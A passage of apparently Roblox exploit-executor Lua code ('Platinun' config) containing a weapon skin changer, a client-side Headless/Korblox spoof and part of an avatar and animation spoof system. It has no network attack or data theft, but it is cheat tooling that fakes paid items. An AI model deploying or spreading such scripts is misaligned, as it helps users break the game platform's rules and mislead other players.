                if tv:IsA('MeshPart') then mesh = tv
                elseif tv:IsA('Model') or tv:IsA('Folder') then mesh = tv:GetChildren() end
            end
        end
        if not isKnife and not mesh and SkinModules and typeof(SkinModules) == 'Instance' then
            local MeshesFolder = SkinModules:FindFirstChild('Meshes')
            if MeshesFolder then
                local skinFolder = MeshesFolder:FindFirstChild(SkinName)
                    or MeshesFolder:FindFirstChild(SkinName:gsub(' ',''))
                    or MeshesFolder:FindFirstChild(SkinName:gsub(' ','_'))
                    or MeshesFolder:FindFirstChild(SkinName:gsub('-',' '))
                if skinFolder then
                    mesh = skinFolder:IsA('MeshPart') and skinFolder or skinFolder:GetChildren()
                end
            end
        end

        -- pick the right mesh part for multi-mesh skins
        local skinMesh = nil
        if mesh and not isKnife then
            if typeof(mesh) == 'Instance' and mesh:IsA('MeshPart') then
                skinMesh = mesh
            elseif type(mesh) == 'table' then
                local wn = Tool.Name:lower():gsub('%[',''):gsub('%]',''):gsub(' ','')
                for _, child in next, mesh do
                    if typeof(child) == 'Instance' and child:IsA('MeshPart') then
                        local lc = child.Name:lower()
                        if (lc:find('tac') and wn=='tacticalshotgun')
                            or (lc:find('rev') and wn=='revolver')
                            or ((lc:find('db') or lc:find('double')) and wn=='double-barrelsg')
                            or (lc:find('aug') and wn=='aug')
                            or (lc:find('rifle') and wn=='rifle') then
                            skinMesh = child; break
                        end
                    end
                end
                if not skinMesh then
                    for _, child in next, mesh do
                        if typeof(child) == 'Instance' and child:IsA('MeshPart') then skinMesh = child; break end
                    end
                end
            end
        end

        local hidDefault = false
        if skinMesh and not isKnife then
            local newFake = skinMesh:Clone()
            newFake.Anchored = false; newFake.CanCollide = false; newFake.CFrame = default.CFrame
            local skinCFrame = (skinInfo and skinInfo.CFrame and typeof(skinInfo.CFrame) == 'CFrame') and skinInfo.CFrame or CFrame.new()
            local weld = Instance.new('Weld')
            weld.Part0 = newFake; weld.Part1 = default; weld.C0 = skinCFrame:Inverse(); weld.Name = '\0'; weld.Parent = newFake
            newFake.Name = '\0'; newFake.Parent = Tool
            default.Transparency = 1; hidDefault = true
            AppliedSkins[Tool].HideDefault = true
            AppliedSkins[Tool].DesiredTransparency = 1
            AppliedSkins[Tool].DesiredTextureID = AppliedSkins[Tool].OriginalTextureID or ''
            table.insert(AppliedSkins[Tool].ClonedChildren, newFake)
        elseif not isKnife and skinInfo then
            local tv = skinInfo.TextureID
            if tv then
                if typeof(tv) == 'Instance' and tv:IsA('MeshPart') then
                    local clone = tv:Clone()
                    clone.Anchored = false; clone.CanCollide = false; clone.CFrame = default.CFrame; clone.Name = '\0'
                    clone.Parent = Tool
                    local sc = (skinInfo.CFrame and typeof(skinInfo.CFrame) == 'CFrame') and skinInfo.CFrame or CFrame.new()
                    local w = Instance.new('Weld'); w.Part0 = clone; w.Part1 = default; w.C0 = sc:Inverse(); w.Name = '\0'; w.Parent = clone
                    default.Transparency = 1; hidDefault = true
                    AppliedSkins[Tool].HideDefault = true
                    AppliedSkins[Tool].DesiredTransparency = 1
                    table.insert(AppliedSkins[Tool].ClonedChildren, clone)
                elseif type(tv) == 'string' then
                    default.TextureID = tv; default.Transparency = 0
                    AppliedSkins[Tool].HideDefault = false
                    AppliedSkins[Tool].DesiredTransparency = 0
                    AppliedSkins[Tool].DesiredTextureID = tv
                end
            end
        end

        if not isKnife and AppliedSkins[Tool] then
            local function StripIntruders()
                if not AppliedSkins[Tool] then return end
                ReapplyGunSkinState(Tool)
            end
            local function IsOurs(nm) return #nm == 0 or nm == '\0' end
            local addConn = Tool.ChildAdded:Connect(function(c)
                if c:IsA('MeshPart') and not IsOurs(c.Name) and c ~= default and c ~= Handle then
                    task.defer(StripIntruders)
                end
            end)
            table.insert(AppliedSkins[Tool].Connections, addConn)
            local defAddConn = default.ChildAdded:Connect(function(c)
                if c:IsA('MeshPart') and not IsOurs(c.Name) then task.defer(StripIntruders) end
            end)
            table.insert(AppliedSkins[Tool].Connections, defAddConn)
            if hidDefault then
                local transConn = default:GetPropertyChangedSignal('Transparency'):Connect(function()
                    if AppliedSkins[Tool] and default.Transparency ~= 1 then default.Transparency = 1 end
                end)
                table.insert(AppliedSkins[Tool].Connections, transConn)
            else
                local transConn = default:GetPropertyChangedSignal('Transparency'):Connect(function()
                    local sd = AppliedSkins[Tool]
                    if sd and sd.DesiredTransparency ~= nil and default.Transparency ~= sd.DesiredTransparency then
                        default.Transparency = sd.DesiredTransparency
                    end
                end)
                table.insert(AppliedSkins[Tool].Connections, transConn)
            end
            local texConn = default:GetPropertyChangedSignal('TextureID'):Connect(function()
                if AppliedSkins[Tool] and default.TextureID ~= AppliedSkins[Tool].DesiredTextureID then
                    default.TextureID = AppliedSkins[Tool].DesiredTextureID or ''
                end
            end)
            table.insert(AppliedSkins[Tool].Connections, texConn)
            task.defer(StripIntruders)
            task.delay(0.10, function() if AppliedSkins[Tool] then ReapplyGunSkinState(Tool) end end)
            task.delay(0.35, function() if AppliedSkins[Tool] then ReapplyGunSkinState(Tool) end end)
        end

        -- handle particles & shoot sound binding
        for _, child in next, Handle:GetChildren() do if #child.Name == 0 then child:Destroy() end end
        if SC_SkinAssets then
            local GunHandleParticle = SC_SkinAssets:FindFirstChild('GunHandleParticle')
            if GunHandleParticle then
                local pf = GunHandleParticle:FindFirstChild(SkinName)
                    or GunHandleParticle:FindFirstChild(SkinName:gsub('-',' '))
                if pf then
                    local emitter = pf:FindFirstChildOfClass('ParticleEmitter')
                    if emitter then
                        local cloned = emitter:Clone(); cloned.Parent = Handle; cloned.Name = '\0'
                        table.insert(AppliedSkins[Tool].ClonedChildren, cloned)
                    end
                end
            end
        end
        BindShootSoundForSkin(Tool)
        local soundConn = Tool.DescendantAdded:Connect(function(desc)
            if desc:IsA('Sound') and (desc.Name == 'Shoot' or desc.Name == 'ShootSound') then
                task.defer(function()
                    if AppliedSkins[Tool] and AppliedSkins[Tool].SkinName == SkinName then
                        BindShootSoundForSkin(Tool)
                    end
                end)
            end
        end)
        table.insert(AppliedSkins[Tool].Connections, soundConn)
        if not isKnife then ScheduleInitialGunRefresh(Tool, SkinName) end
    end

    -- ── ProcessTool ───────────────────────────────────────────────
    ProcessTool = function(Tool)
        if ToolRegistry[Tool] then return end
        ToolRegistry[Tool] = true
        local cfg = GetSkinChangerCfg()
        if not cfg or not cfg['Enabled'] then return end
        local Skins = cfg['Weapons List']
        local ConfiguredSkin = Skins[Tool.Name]
        if not ConfiguredSkin then
            local stripped = Tool.Name:gsub('%[',''):gsub('%]','')
            ConfiguredSkin = Skins['[' .. stripped .. ']']
        end
        if not ConfiguredSkin or ConfiguredSkin == '' or ConfiguredSkin == 'None' then return end

        local isKnife = Tool.Name:lower():find('knife') ~= nil or Tool.Name == '[Knife]'
        if isKnife and IsKnifeSkin(ConfiguredSkin) then
            ApplySkinToTool(Tool, ConfiguredSkin)
            local equipConn
            equipConn = Tool.Equipped:Connect(function()
                if not AppliedSkins[Tool] then if equipConn then equipConn:Disconnect() end; return end
                local char = Tool.Parent
                if char ~= LocalPlayer_SC.Character then return end
                ApplyKnife(char, Tool, ConfiguredSkin)
            end)
            if not AppliedSkins[Tool] then AppliedSkins[Tool] = { Connections = {} } end
            if not AppliedSkins[Tool].Connections then AppliedSkins[Tool].Connections = {} end
            table.insert(AppliedSkins[Tool].Connections, equipConn)
            if LocalPlayer_SC.Character and Tool.Parent == LocalPlayer_SC.Character then
                ApplyKnife(LocalPlayer_SC.Character, Tool, ConfiguredSkin)
            end
            -- attack anim/sound binding
            if AppliedSkins[Tool] and (AppliedSkins[Tool].KnifeAttackAnim or AppliedSkins[Tool].KnifeAttackSound) then
                local attackConn
                attackConn = Tool.Activated:Connect(function()
                    local sd = AppliedSkins[Tool]
                    if not sd then if attackConn then attackConn:Disconnect() end; return end
                    if sd.KnifeAttackSound then
                        local snd = Instance.new('Sound'); snd.SoundId = sd.KnifeAttackSound; snd.Volume = 1
                        snd.Parent = Tool:FindFirstChild('Handle') or Tool; snd:Play()
                        game.Debris:AddItem(snd, 3)
                    end
                    if sd.KnifeAttackAnim then
                        local char = LocalPlayer_SC.Character
                        if char then
                            local hum = char:FindFirstChildOfClass('Humanoid')
                            if hum then
                                local animator = hum:FindFirstChildOfClass('Animator')
                                if not animator then animator = Instance.new('Animator'); animator.Parent = hum end
                                local anim = Instance.new('Animation'); anim.AnimationId = sd.KnifeAttackAnim.AnimationId
                                local track = animator:LoadAnimation(anim)
                                track.Priority = Enum.AnimationPriority.Action; track:Play(); anim:Destroy()
                            end
                        end
                    end
                end)
                table.insert(AppliedSkins[Tool].Connections, attackConn)
            end
        else
            ApplySkinToTool(Tool, ConfiguredSkin)
            Tool.Equipped:Connect(function()
                local char = Tool.Parent
                if char ~= LocalPlayer_SC.Character then return end
                ApplySkinToTool(Tool, ConfiguredSkin)
            end)
            if LocalPlayer_SC.Character and Tool.Parent == LocalPlayer_SC.Character then
                ApplySkinToTool(Tool, ConfiguredSkin)
            end
        end
    end

    local function ProcessCharacter_SC(Character)
        if not Character then return end
        for _, Child in next, Character:GetChildren() do
            if Child:IsA('Tool') then ProcessTool(Child) end
        end
        Character.ChildAdded:Connect(function(Child)
            if Child:IsA('Tool') then task.wait(0.1); ProcessTool(Child) end
        end)
    end

    local function ProcessBackpack_SC(Backpack)
        if not Backpack then return end
        for _, Tool in next, Backpack:GetChildren() do
            if Tool:IsA('Tool') then ProcessTool(Tool) end
        end
        Backpack.ChildAdded:Connect(function(Tool)
            if Tool:IsA('Tool') then task.wait(0.1); ProcessTool(Tool) end
        end)
    end

    local function GetConfiguredSkinFor(Tool)
        local cfg = GetSkinChangerCfg()
        if not cfg or not cfg['Enabled'] then return nil end
        local Skins = cfg['Weapons List']
        local s = Skins[Tool.Name]
        if not s then
            local stripped = Tool.Name:gsub('%[',''):gsub('%]','')
            s = Skins['[' .. stripped .. ']']
        end
        if not s or s == '' or s == 'None' then return nil end
        return s
    end

    local function ReapplyAllSkins_SC()
        local function reapplyContainer(Container)
            if not Container then return end
            for _, Tool in next, Container:GetChildren() do
                if Tool:IsA('Tool') then
                    local NewSkin     = GetConfiguredSkinFor(Tool)
                    local CurrentSkin = AppliedSkins[Tool] and AppliedSkins[Tool].SkinName or nil
                    if NewSkin ~= CurrentSkin then
                        ToolRegistry[Tool] = nil
                        InitialGunSkinRefreshDone[Tool] = nil
                        pcall(function() RemoveSkinFromTool(Tool) end)
                        pcall(function() ProcessTool(Tool) end)
                    end
                end
            end
        end
        reapplyContainer(LocalPlayer_SC.Character)
        reapplyContainer(LocalPlayer_SC:FindFirstChild('Backpack'))
    end

    -- throttled skin enforcement (was every frame -> lag)
    local _skinLast = 0
    RunService_SC.Heartbeat:Connect(function()
        if not GetSkinChangerCfg()['Enabled'] then return end
        local now = os.clock()
        if now - _skinLast < 0.6 then return end
        _skinLast = now
        local char = LocalPlayer_SC.Character
        if not char then return end
        for _, Child in next, char:GetChildren() do
            if Child:IsA('Tool') then
                local configured = GetConfiguredSkinFor(Child)
                local current    = AppliedSkins[Child] and AppliedSkins[Child].SkinName
                if configured and configured ~= current then
                    ToolRegistry[Child] = nil
                    pcall(function() ProcessTool(Child) end)
                end
            end
        end
    end)

    -- boot
    task.spawn(LoadSkinData)
    local bootChar    = LocalPlayer_SC.Character or LocalPlayer_SC.CharacterAdded:Wait()
    local bootBackpack = LocalPlayer_SC:FindFirstChild('Backpack') or LocalPlayer_SC:WaitForChild('Backpack', 5)
    ProcessCharacter_SC(bootChar)
    if bootBackpack then ProcessBackpack_SC(bootBackpack) end
    LocalPlayer_SC.CharacterAdded:Connect(function(NewChar)
        task.wait(0.5)
        ProcessCharacter_SC(NewChar)
        local nb = LocalPlayer_SC:FindFirstChild('Backpack') or LocalPlayer_SC:WaitForChild('Backpack', 5)
        if nb then ProcessBackpack_SC(nb) end
    end)
end
--=================================================================
-- END ADVANCED SKIN CHANGER
--=================================================================
--=================================================================
-- HEADLESS / KORBLOX (standalone, cider-style)
--=================================================================
do
    local Players      = game:GetService("Players")
    local RunService   = game:GetService("RunService")
    local LocalPlayer  = Players.LocalPlayer

    local HEADLESS_HEAD_ASSET_ID     = 134082579
    local KORBLOX_RIGHT_LEG_ASSET_ID = 139607718
    local KORBLOX_PARTS = {
        RightLowerLeg = { mesh = 902942093, hidden = true },
        RightUpperLeg = { mesh = 902942096, texture = 902843398 },
        RightFoot    = { mesh = 902942089, hidden = true },
    }

    local function GetCfg()
        local s = getgenv()
        return s and s['Platinun'] and s['Platinun']['Player Modifications'] and s['Platinun']['Player Modifications']['Avatar Changer']
    end

    local function IsEnabled(option)
        local cfg = GetCfg()
        if not cfg then return false end
        if cfg['Enabled'] ~= true then return false end
        local extra = cfg['Extra']
        if type(extra) == 'table' and extra[option] ~= nil then
            return extra[option] == true
        end
        return cfg[option] == true
    end

    local function PurgeHeadFaces(head)
        if not head then return end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") then
                child.Transparency = 1
            end
        end
    end

    local function ApplyHeadless(char)
        if not char then return end
        if not IsEnabled('Headless') then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        head.Transparency = 1
        PurgeHeadFaces(head)
        -- also destroy face mesh textures on meshpart heads
        if head:IsA("MeshPart") then pcall(function() head.TextureID = "" end) end
    end

    local function ApplyKorblox(char)
        if not char then return end
        local existingShell = char:FindFirstChild("PhantomShell")
        if not IsEnabled('Korblox') then
            if existingShell then existingShell:Destroy() end
            return
        end

        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end

        if humanoid.RigType == Enum.HumanoidRigType.R15 then
            if existingShell then existingShell:Destroy() end
            for partName, data in pairs(KORBLOX_PARTS) do
                local part = char:FindFirstChild(partName)
                if part then
                    pcall(function() part.MeshId = "rbxassetid://" .. data.mesh end)
                    if data.texture then
                        pcall(function() part.TextureID = "rbxassetid://" .. data.texture end)
                    end
                    if data.hidden then
                        part.Transparency = 1
                    end
                end
            end
            return
        end

        -- R6 fallback
        local base = char:FindFirstChild("Right Leg")
        if not base then return end
        base.Transparency = 1
        if existingShell then existingShell:Destroy() end

        local shell = Instance.new("Part")
        shell.Name = "PhantomShell"
        shell.Size = Vector3.new(1, 2, 1)
        shell.CanCollide = false
        shell.CanTouch = false
        shell.Massless = true
        shell.CFrame = base.CFrame * CFrame.new(0, 0.75, 0)
        shell.Parent = char

        local weld = Instance.new("WeldConstraint")
        weld.Part0 = shell
        weld.Part1 = base
        weld.Parent = shell

        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = "rbxassetid://902942093"
        mesh.TextureId = "rbxassetid://902843398"
        mesh.Scale = Vector3.new(0.85, 1.25, 0.85)
        mesh.Parent = shell
    end

    local function ApplyBoth(char)
        ApplyHeadless(char)
        ApplyKorblox(char)
    end

    local conn

    local function Setup(char)
        if conn then conn:Disconnect(); conn = nil end
        if not char then return end

        ApplyBoth(char)

        conn = char.DescendantAdded:Connect(function(desc)
            if desc:IsA("Decal") and desc.Parent and desc.Parent.Name == "Head" then
                if IsEnabled('Headless') then
                    desc.Transparency = 1
                end
                return
            end
            local name = desc.Name
            if name == "Head" or name == "Humanoid" or name == "Right Leg" or KORBLOX_PARTS[name] then
                task.defer(function()
                    if char.Parent then ApplyBoth(char) end
                end)
            end
        end)

        -- periodic re-apply (server can reset appearance)
        task.spawn(function()
            while char.Parent do
                task.wait(5)
                if char.Parent then ApplyBoth(char) end
            end
        end)
    end

    if LocalPlayer.Character then Setup(LocalPlayer.Character) end
    LocalPlayer.CharacterAdded:Connect(Setup)
end
--=================================================================
-- END HEADLESS / KORBLOX
--=================================================================

--=================================================================
-- AVATAR / ANIMATION / EMOTE SPOOF SYSTEM
--=================================================================
do
    if getgenv().avatar_cleanup then
        pcall(getgenv().avatar_cleanup)
        getgenv().avatar_cleanup = nil
    end

    local Players           = game:GetService("Players")
    local RunService        = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local CoreGui           = game:GetService("CoreGui")
    local GuiService        = game:GetService("GuiService")
    local InsertService     = game:GetService("InsertService")

    local LocalPlayer = Players.LocalPlayer
    local Camera      = workspace.CurrentCamera

    local okEnv, env = pcall(function() return getgenv() end)
    if not okEnv then env = nil end

    shared.Cider = shared.Cider or {}
    shared.Cider['Char'] = {
        ['Enabled'] = (getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Enabled'] == true),
        ['Target']  = tostring(getgenv()['Platinun']['Player Modifications']['Avatar Changer']['User ID']),
        ['Body Size'] = { ['Enabled'] = (getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Enabled'] == true), ['Mode'] = 'Skinny' },
        ['Animations'] = {
            ['Enabled']  = (getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Enabled'] == true),
            ['Idle']     = getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Animations']['idle'] or 'Zombie',
            ['Run']      = getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Animations']['run'] or 'Zombie',
            ['Walk']     = getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Animations']['walk'] or 'Zombie',
            ['Jump']     = getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Animations']['jump'] or 'Ninja',
            ['Fall']     = getgenv()['Platinun']['Player Modifications']['Avatar Changer']['Animations']['fall'] or 'Ninja',
            ['Climb']    = 'Ninja',
            ['Swim']     = 'Default',
            ['SwimIdle'] = 'Default',
        },
    }

    local Cfg = shared.Cider['Char']
    local CONFIG = {
        target = Cfg['Target'] or '',
        changer = {
            enabled = Cfg['Enabled'] == true and (Cfg['Body Size'] and Cfg['Body Size']['Enabled'] ~= false),
            width = 1, depth = 1, height = 1, head = 1, proportion = 1, bodyType = 0,
            targetScales = nil,
            enforceIntervalSeconds = 1.5,
        },
        animations = Cfg['Animations'] or {},
    }

    do
        local Size = Cfg['Body Size'] or {}
        local Profiles = {
            Skinny = { width=0.52, depth=0.52, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
            Normal = { width=1.00, depth=1.00, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
            Fat    = { width=1.50, depth=1.50, height=1.00, head=1.00, proportion=1.00, bodyType=0.00 },
        }
        local p = Profiles[Size['Mode']] or Profiles.Skinny
        CONFIG.changer.width      = p.width
        CONFIG.changer.depth      = p.depth
        CONFIG.changer.height     = p.height
        CONFIG.changer.head       = p.head
        CONFIG.changer.proportion = p.proportion
        CONFIG.changer.bodyType   = p.bodyType
    end

    local ANIM_PRESETS = {
        ['Ninja']      = { Idle='rbxassetid://656118341', Run='rbxassetid://656118852', Walk='rbxassetid://656121766', Jump='rbxassetid://656117878', Fall='rbxassetid://10921159222', Climb='rbxassetid://656114359', Swim='rbxassetid://10921161002', SwimIdle='rbxassetid://10922757002' },
        ['Robot']      = { Idle='rbxassetid://616089559', Run='rbxassetid://616091570', Walk='rbxassetid://616095330', Jump='rbxassetid://616090535', Fall='rbxassetid://616092998', Climb='rbxassetid://616086039', Swim='rbxassetid://10921253142', SwimIdle='rbxassetid://10921253767' },
        ['Default']    = { Idle='rbxassetid://507766666', Run='rbxassetid://10921261968', Walk='rbxassetid://10921269718', Jump='rbxassetid://10921263860', Fall='rbxassetid://10921262864', Climb='rbxassetid://10921257536', Swim='rbxassetid://10921264784', SwimIdle='rbxassetid://10921265698' },
        ['Custom']     = { Idle='rbxassetid://92080889861410', Run='rbxassetid://16738337225', Walk='rbxassetid://16738340646', Jump='rbxassetid://104325245285198', Fall='rbxassetid://616003713', Climb='rbxassetid://18537363391', Swim='rbxassetid://133308483266208', SwimIdle='rbxassetid://109346520324160' },
        ['Levitate']   = { Idle='rbxassetid://616008087', Run='rbxassetid://616010382', Walk='rbxassetid://616013216', Jump='rbxassetid://616008936', Fall='rbxassetid://616005863', Climb='rbxassetid://616003713', Swim='rbxassetid://10921139478', SwimIdle='rbxassetid://10921138209' },
        ['Mage']       = { Idle='rbxassetid://707855907', Run='rbxassetid://707861613', Walk='rbxassetid://707897309', Jump='rbxassetid://707853694', Fall='rbxassetid://707829716', Climb='rbxassetid://707826056', Swim='rbxassetid://10921150788', SwimIdle='rbxassetid://10921151661' },
        ['Stylish']    = { Idle='rbxassetid://616138447', Run='rbxassetid://616140816', Walk='rbxassetid://616146177', Jump='rbxassetid://616139451', Fall='rbxassetid://616134815', Climb='rbxassetid://616133594', Swim='rbxassetid://10921281000', SwimIdle='rbxassetid://10921281964' },
        ['Hero']       = { Idle='rbxassetid://616113536', Run='rbxassetid://616117076', Walk='rbxassetid://616122287', Jump='rbxassetid://616115533', Fall='rbxassetid://616108001', Climb='rbxassetid://616104706', Swim='rbxassetid://10921295495', SwimIdle='rbxassetid://10921297391' },
        ['Toy']        = { Idle='rbxassetid://782845736', Run='rbxassetid://782842708', Walk='rbxassetid://782843345', Jump='rbxassetid://782847020', Fall='rbxassetid://782846423', Climb='rbxassetid://782843869', Swim='rbxassetid://10921309319', SwimIdle='rbxassetid://10921310341' },
        ['Astronaut']  = { Idle='rbxassetid://891633237', Run='rbxassetid://891636393', Walk='rbxassetid://891667138', Jump='rbxassetid://891627522', Fall='rbxassetid://891617961', Climb='rbxassetid://891609353', Swim='rbxassetid://10921044000', SwimIdle='rbxassetid://10921045006' },
        ['Bubbly']     = { Idle='rbxassetid://910009958', Run='rbxassetid://910025107', Walk='rbxassetid://910034870', Jump='rbxassetid://910016857', Fall='rbxassetid://910001910', Climb='rbxassetid://742636889', Swim='rbxassetid://10921063569', SwimIdle='rbxassetid://10922582160' },
        ['Cartoony']   = { Idle='rbxassetid://742638445', Run='rbxassetid://742638842', Walk='rbxassetid://742640026', Jump='rbxassetid://742637942', Fall='rbxassetid://742637151', Climb='rbxassetid://742636889', Swim='rbxassetid://10921079380', SwimIdle='rbxassetid://10921081059' },
        ['Elder']      = { Idle='rbxassetid://845400520', Run='rbxassetid://845386501', Walk='rbxassetid://845403856', Jump='rbxassetid://845398858', Fall='rbxassetid://845396048', Climb='rbxassetid://845392038', Swim='rbxassetid://10921108971', SwimIdle='rbxassetid://10921110146' },
        ['Ghost']      = { Idle='rbxassetid://616008087', Run='rbxassetid://616013216', Walk='rbxassetid://616013216', Jump='rbxassetid://616008936', Fall='rbxassetid://616005863', Climb='rbxassetid://616156119', Swim='rbxassetid://133308483266208', SwimIdle='rbxassetid://109346520324160' },
        ['Knight']     = { Idle='rbxassetid://657568135', Run='rbxassetid://657564596', Walk='rbxassetid://657552124', Jump='rbxassetid://658409194', Fall='rbxassetid://657600338', Climb='rbxassetid://658360781', Swim='rbxassetid://10921125160', SwimIdle='rbxassetid://10921125935' },
        ['Vampire']    = { Idle='rbxassetid://1083450166', Run='rbxassetid://1083462077', Walk='rbxassetid://1083473930', Jump='rbxassetid://1083455352', Fall='rbxassetid://1083443587', Climb='rbxassetid://1083439238', Swim='rbxassetid://10921324408', SwimIdle='rbxassetid://10921325443' },
        ['Werewolf']   = { Idle='rbxassetid://1083214717', Run='rbxassetid://1083216690', Walk='rbxassetid://1083178339', Jump='rbxassetid://1083218792', Fall='rbxassetid://1083189019', Climb='rbxassetid://1083182000', Swim='rbxassetid://10921340419', SwimIdle='rbxassetid://10921341319' },
        ['Zombie']     = { Idle='rbxassetid://616160636', Run='rbxassetid://616163682', Walk='rbxassetid://616168032', Jump='rbxassetid://616161997', Fall='rbxassetid://616157476', Climb='rbxassetid://616156119', Swim='rbxassetid://10921352344', SwimIdle='rbxassetid://10921353442' },
        ['Bold']       = { Idle='rbxassetid://16738334710', Run='rbxassetid://16738337225', Walk='rbxassetid://16738340646', Jump='rbxassetid://16738336650', Fall='rbxassetid://16738333171', Climb='rbxassetid://16738332169', Swim='rbxassetid://16738339158', SwimIdle='rbxassetid://16738339817' },
        ['Adidas']     = { Idle='rbxassetid://18537371272', Run='rbxassetid://18537384940', Walk='rbxassetid://18537392113', Jump='rbxassetid://18537380791', Fall='rbxassetid://18537367238', Climb='rbxassetid://18537363391', Swim='rbxassetid://18537389531', SwimIdle='rbxassetid://18537387180' },
        ['Pirate']     = { Idle='rbxassetid://750782770', Run='rbxassetid://750783738', Walk='rbxassetid://750785693', Jump='rbxassetid://750782230', Fall='rbxassetid://750780242', Climb='rbxassetid://750779899', Swim='rbxassetid://750784579', SwimIdle='rbxassetid://750785176' },
        ['Oldschool']  = { Idle='rbxassetid://10921232093', Run='rbxassetid://10921240218', Walk='rbxassetid://10921244891', Jump='rbxassetid://10921242013', Fall='rbxassetid://10921241244', Climb='rbxassetid://10921229866', Swim='rbxassetid://10921243048', SwimIdle='rbxassetid://10921244018' },
    }

    local ANIM_FOLDER_MAP = {
        ['Idle']     = { Folder='idle',     Children={'Animation1','Animation2'} },
        ['Run']      = { Folder='run',      Children={'RunAnim'} },
        ['Walk']     = { Folder='walk',     Children={'WalkAnim'} },
        ['Jump']     = { Folder='jump',     Children={'JumpAnim'} },
        ['Fall']     = { Folder='fall',     Children={'FallAnim'} },
        ['Climb']    = { Folder='climb',    Children={'ClimbAnim'} },
        ['Swim']     = { Folder='swim',     Children={'Swim'} },
        ['SwimIdle'] = { Folder='swimidle', Children={'SwimIdleAnim'} },
    }

    local CACHE_MAX = { faceTexture=80, description=40, appearanceModel=24, appearanceInfo=60, resolvedUserId=120, emoteData=80 }
    local faceTextureCache, faceTextureCacheTime = {}, {}
    local descriptionCache, appearanceModelCache, appearanceInfoCache = {}, {}, {}
    local resolvedUserIdCache, resolvedUserIdCacheTime = {}, {}

    local function prunePaired(vc, tc, maxEntries)
        local count = 0
        for _ in pairs(vc) do count = count + 1 end
        while count > maxEntries do
            local oldestKey, oldestTs = nil, math.huge
            for k in pairs(vc) do
                local ts = tc[k] or 0
                if ts < oldestTs then oldestTs = ts; oldestKey = k end
            end
            if oldestKey == nil then break end
            vc[oldestKey] = nil; tc[oldestKey] = nil
            count = count - 1
        end
    end

    local function cacheGetTimed(vc, tc, key, ttl)
        local v = vc[key]; local ts = tc[key]
        if v ~= nil and ts and os.clock() - ts <= ttl then return v end
        if v ~= nil then vc[key] = nil end
        if ts ~= nil then tc[key] = nil end
        return nil
    end

    local function cacheSetTimed(vc, tc, key, value, maxEntries)
        vc[key] = value; tc[key] = os.clock()
        prunePaired(vc, tc, maxEntries)
        return value
    end

    local AVATAR_CACHE_TTL = 20
    local RESOLVED_USERID_TTL = 600

    local function destroyDesc(e) if e and e.desc then pcall(function() e.desc:Destroy() end) end end
    local function destroyModel(e) if e and e.model then pcall(function() e.model:Destroy() end) end end

    local function getAppearanceModel(userId)
        local entry = appearanceModelCache[userId]
        if entry and entry.model and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            local ok, c = pcall(function() return entry.model:Clone() end)
            if ok and c then return c end
        end
        local ok, model = pcall(function() return Players:GetCharacterAppearanceAsync(userId) end)
        if not ok or not model then return nil end
        local okS, stored = pcall(function() return model:Clone() end)
        if okS and stored then
            local prev = appearanceModelCache[userId]
            if prev and prev.model then pcall(function() prev.model:Destroy() end) end
            appearanceModelCache[userId] = { model = stored, timestamp = os.clock() }
        end
        return model
    end

    local function getTargetDescriptionCached(userId)
        local entry = descriptionCache[userId]
        if entry and entry.desc and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            local ok, c = pcall(function() return entry.desc:Clone() end)
            if ok and c then return c end
        end
        local ok, desc = pcall(function() return Players:GetHumanoidDescriptionFromUserId(userId) end)
        if not ok or not desc then return nil end
        local okS, stored = pcall(function() return desc:Clone() end)
        if okS and stored then
            local prev = descriptionCache[userId]
            if prev and prev.desc then pcall(function() prev.desc:Destroy() end) end
            descriptionCache[userId] = { desc = stored, timestamp = os.clock() }
        end
        local okR, ret = pcall(function() return desc:Clone() end)
        return (okR and ret) or desc
    end

    local function getAppearanceInfoCached(userId)
        local entry = appearanceInfoCache[userId]
        if entry and entry.info and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            return entry.info
        end
        local ok, info = pcall(function() return Players:GetCharacterAppearanceInfoAsync(userId) end)
        if ok and info then
            appearanceInfoCache[userId] = { info = info, timestamp = os.clock() }
            return info
        end
        return nil
    end

    local function clearAvatarCaches()
        for _, e in pairs(descriptionCache) do destroyDesc(e) end
        for _, e in pairs(appearanceModelCache) do destroyModel(e) end
        descriptionCache, appearanceModelCache, appearanceInfoCache = {}, {}, {}
        faceTextureCache, faceTextureCacheTime = {}, {}
        resolvedUserIdCache, resolvedUserIdCacheTime = {}, {}
    end

    local function normalizeForLookup(v)
        v = string.lower(tostring(v or ""))
        v = v:gsub("^@", ""):gsub("%s+", ""):gsub("_+", "")
        return v
    end

    local function findUserIdInServerByNameOrDisplay(inputText)
        local raw = tostring(inputText or ""):gsub("^%s+",""):gsub("%s+$","")
        local needleRaw = string.lower(raw)
        local needleNorm = normalizeForLookup(raw)
        if needleNorm == "" then return nil end
        local exactName, exactDisplay, exactDisplayCount = nil, nil, 0
        local prefixes = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            local nameRaw = string.lower(plr.Name)
            local dispRaw = string.lower(plr.DisplayName)
            local nameNorm = normalizeForLookup(plr.Name)
            local dispNorm = normalizeForLookup(plr.DisplayName)
            if nameRaw == needleRaw or nameNorm == needleNorm then exactName = plr.UserId; break end
            if dispRaw == needleRaw or dispNorm == needleNorm then
                exactDisplay = plr.UserId; exactDisplayCount = exactDisplayCount + 1
            end
            if (needleRaw ~= "" and nameRaw:sub(1,#needleRaw) == needleRaw)
                or nameNorm:sub(1,#needleNorm) == needleNorm
                or (needleRaw ~= "" and dispRaw:sub(1,#needleRaw) == needleRaw)
                or dispNorm:sub(1,#needleNorm) == needleNorm then
                prefixes[#prefixes+1] = plr.UserId
            end
        end
        if exactName then return exactName end
